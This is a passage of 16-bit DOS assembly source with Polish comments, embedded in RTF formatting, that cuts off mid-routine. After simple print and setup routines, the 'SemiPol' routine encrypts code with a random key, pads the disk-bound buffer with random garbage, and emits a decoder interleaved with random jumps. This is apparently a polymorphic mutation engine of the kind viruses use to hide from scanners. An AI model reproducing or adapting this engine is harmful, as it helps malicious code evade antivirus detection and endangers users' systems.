\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; spod adresu CS:SI i dodaje Enter}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       push  si                          ; SI sie zmienia, trzeba zachowac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       Call  Druk                        ; najpierw wyswietl tekst}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       lea   si,TeCRLF                   ; \\ a teraz dodaj CR,LF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       Call  Druk                        ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       pop   si                          ; przywroc SI}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       ret                               ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukLn endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Druk proc near                          ; procedura wyswietla tekst ASCIIZ}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; spod adresu CS:SI}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       push ax                           ; \\ zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       push si                           ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukNastepnyZnak:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       lods byte ptr cs:[si]             ; wez kolejny znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       or al,al                          ; czy znak jest zerem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       jz DrukPowrot                     ; tak=koniec napisu, wyjdz z petli}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       Call DrukZnak                     ; jezeli nie, to wyswietl (znak w AL)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       jmp short DrukNastepnyZnak        ; idz po nastepny znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukPowrot:                             ; tekst wydrukowany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       pop  si                           ; \\ przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       pop  ax                           ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       ret                               ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Druk endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukZnak proc near                      ; procedura wyswietla znak w AL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       push ax                           ; zachowaj zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov  ah,0Eh                       ; funkcja BIOS - wyswietl znak w AL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       int  10h                          ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       pop  ax                           ; przywroc zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       ret                               ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukZnak endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch InicjujSystem proc near                 ; ustawia stos, DS, ES itd.}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       pop   bp                          ; zachowaj adres powrotu z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; bo stos zostanie przeniesiony}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   CS:PSP_Segment,ds           ; zapamietaj PSP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   ax,cs                       ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   ds,ax                       ;  - CS=DS=ES}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   es,ax                       ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   ss,ax                       ; \\ stos na koniec programu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       lea   sp,StosKoniec               ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       cld                               ; DF=1, zwiekszaj przy operacjach lancuchowych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       jmp   bp                          ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch InicjujSystem endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SemiPol:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       push  ax si di                    ; zachowaj na stosie zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       shr   cx,1                        ; dlugosc/2 bo szyfrujemy slowa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       inc   cx                          ; dla pewnosci, ze wszystkie bajty zostana}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; zaszyfrowane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   Semi_IleDanych,cx           ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   Semi_Skad,si                ;  - zachowaj dane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   Semi_Dokad,di               ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       call  PseudoLosowa                ; wez przypadkowa liczbe}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   Semi_Losowa,ax              ; bedzie jej uzywac szyfrator i deszyfrator}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; szyfruj kod}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       lea   di,TMPBufor                 ; gdzie zapisac szyfrowany kod}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   Szyfruj:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       lodsw                             ; wez dana}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       add   ax,Semi_Losowa              ; szyfruj ja}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       stosw                             ; zapisz zaszyfrowana dana}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       loop  Szyfruj                     ; powtarzaj szyfrowanie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; wpisz "smieci" do bufora}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   di,Semi_Dokad               ; bufor docelowy (do zapisu na dysk)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   cx,256                      ; CX:=AX:=ile slow zapisac (1..256)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch  Smietnik:                              ; wypelnianie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       Call  Pseudolosowa                ; wez przypadkowa dana}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       stosw                             ; zapisz ja}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       loop  Smietnik                    ; zapisz "smieci" w buforze}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; generuj procedure dekodera}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; Dekoder ma nastepujaca postac :}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ;        mov si,PoczatekDanych BE,????}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ;        mov cx,IleDanych      B9,????}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ;    Petla:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ;        sub  [si],Losowa      81,2C,????}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ;        dec  cx               49}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ;        jz  Koniec            74,??}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ;        jmp Petla             E9,????}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ;     Koniec:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   di,Semi_Dokad               ; bufor docelowy (do zapisu na dysk)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       call  LosowySkok                  ; wstaw losowy skok}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   al,0BEh                     ; DEKODER: mov si, ofset Poczaek}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       stosb                             ; BE,????}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   Semi_GdziePocz,di           ; ofset bedzie wstawiony pozniej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       stosw                             ; zostaw miejsce na ofset}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       call  LosowySkok                  ; wstaw losowy skok}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   al,0B9h                     ; DEKODER: mov cx,IleDanych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       stosb                             ; B9,????}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   ax,Semi_IleDanych           ; wpisz, ile danych do odszyfrowania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       stosw                             ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       call  LosowySkok                  ; wstaw losowy skok}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   Semi_Petla,di               ; DEKODER: sub [si],Losowa}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   ax,2C81h                    ; pierwsza czesc rozkazu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       stosw}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   ax,Semi_Losowa              ; zapisz wartosc dekodujaca}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       stosw                             ; zaszyfrowany program}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       call  LosowySkok                  ; wstaw losowy skok}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   al,46h                      ; DEKODER: inc si}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       stosb}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       call  LosowySkok                  ; wstaw losowy skok}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   al,46h                      ; DEKODER: inc si}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       stosb}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       call  LosowySkok                  ; wstaw losowy skok}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       mov   al,49h                      ; DEKODER: dec cx}{\f2\fs24\lang1045{\*\listtag0}\par}
